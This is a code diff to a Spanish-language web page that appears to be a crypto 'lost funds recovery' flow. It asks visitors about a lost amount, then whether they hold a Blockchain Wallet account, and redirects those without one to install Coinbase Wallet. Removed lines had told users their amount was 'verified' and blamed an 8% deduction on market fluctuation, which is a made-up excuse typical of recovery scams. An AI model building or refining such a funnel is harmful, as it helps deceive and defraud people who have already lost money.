@@ -14,6 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
         .container {
@@ -24,6 +25,7 @@
             padding: 25px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             text-align: center;
+            overflow-y: auto; /* Asegura que el contenido se desplace si el teclado está visible */
         }
 
         h1 {
@@ -95,16 +97,17 @@
         </div>
 
         <div id="step2" class="hidden">
-            <p>Felicidades, monto verificado.</p>
-            <p>La diferencia del 8% se debe a la fluctuación del mercado.</p>
-            <button class="button" onclick="nextStep()">Continuar</button>
-        </div>
-
-        <div id="step3" class="hidden">
+            <p><strong>Nota Importante:</strong> Asegúrate de tener los datos correctos antes de continuar.</p>
             <p>Paso 1: Por favor, asegúrate de tener una cuenta verificada en Blockchain Wallet.</p>
             <p>¿Tienes una cuenta en Blockchain Wallet?</p>
             <button class="button" onclick="hasBinanceAccount(true)">Sí</button>
             <button class="button" onclick="hasBinanceAccount(false)">No</button>
+        </div>
+
+        <div id="step3" class="hidden">
+            <p>¿Qué tipo de dispositivo tienes?</p>
+            <button class="button" onclick="deviceType('iPhone')">iPhone</button>
+            <button class="button" onclick="deviceType('Android')">Android</button>
         </div>
 
         <div id="step4" class="hidden">
@@ -121,22 +124,24 @@
                 return;
             }
 
-            const adjustedAmount = lostAmount * 0.92; // Restamos el 8%
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
         }
 
-        function nextStep() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
-        }
-
         function hasBinanceAccount(hasAccount) {
-            document.getElementById('step3').classList.add('hidden');
+            document.getElementById('step2').classList.add('hidden');
             if (hasAccount) {
                 document.getElementById('step4').classList.remove('hidden');
             } else {
-                // Aquí podrías añadir más pasos o mensajes si el usuario no tiene cuenta
+                document.getElementById('step3').classList.remove('hidden');
+            }
+        }
+
+        function deviceType(type) {
+            if (type === 'iPhone') {
+                window.location.href = 'https://apps.apple.com/us/app/coinbase-wallet-nfts-crypto/id1278383455';
+            } else if (type === 'Android') {
+                window.location.href = 'https://play.google.com/store/apps/details?id=org.toshi&hl=en';
             }
         }
     </script>
